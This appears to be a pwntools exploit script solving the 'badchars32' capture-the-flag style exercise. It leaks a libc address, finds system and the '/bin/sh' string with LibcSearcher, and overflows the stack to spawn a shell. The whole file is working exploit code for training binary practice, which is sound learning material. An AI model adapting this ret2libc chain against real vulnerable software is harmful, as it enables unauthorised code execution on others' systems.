from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"

p = process("./badchars32")
elf = ELF("./badchars32")

target_func_name = "fgets"
puts_plt = elf.plt["puts"]
# puts_got = elf.got["puts"]
target_func_got = elf.got[target_func_name]

badchars = ["\x62" , "\x69" , "\x63" , "\x2f" , "\x20" , "\x66" , "\x6e" , "\x73"]
def check_payload_and_send(payload):
	for badchar in badchars:
		if badchar in payload:
			print payload
			print "payload have badchars " + hex(ord(badchar))
			exit(0) 
	p.sendline(payload)
	
def print_got():
	for i in elf.got:
		print ( i , hex(elf.got[i]))
# print_got()
pwn_me = elf.symbols["pwnme"]

p.recvuntil("\n> ")# end

payload = "a" * 0x28 + "a" * 4 + p32(puts_plt) + p32(pwn_me) + p32(target_func_got)
# gdb.attach(p , "b *0x080487A8")
check_payload_and_send(payload)
target_func_addr = u32(p.recv(4))

print hex(target_func_addr)
libc = LibcSearcher(target_func_name , target_func_addr)
libc_base = target_func_addr - libc.dump(target_func_name)
str_bin_sh = libc_base + libc.dump("str_bin_sh")

system = elf.symbols["system"]
payload2 = "a" * 0x28 + "a" * 4 + p32(system) + p32(pwn_me) + p32(str_bin_sh)
check_payload_and_send(payload2)

p.interactive()
